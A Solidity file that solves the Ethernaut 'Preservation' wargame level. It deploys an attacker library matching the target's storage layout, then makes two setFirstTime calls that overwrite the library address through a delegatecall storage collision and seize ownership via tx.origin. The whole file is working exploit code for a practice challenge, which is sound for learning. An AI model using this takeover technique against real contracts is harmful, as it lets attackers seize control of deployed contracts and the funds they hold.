// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationExploitTimeZoneLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = tx.origin;
    }
}

contract PreservationExploit {
    IPreservation public implementation;
    PreservationExploitTimeZoneLibrary public attackLibrary;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Preservation` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC
    constructor(IPreservation _implementation) {
        implementation = _implementation;
        attackLibrary = new PreservationExploitTimeZoneLibrary();
    }

    /// @notice Calls `setFirstTime()` using the uint256 value of attack contract's address as the `_timeStamp` parameter
    function exploit() external {
        implementation.setFirstTime(uint256(uint160(address(attackLibrary))));

        implementation.setFirstTime(0);
    }
}
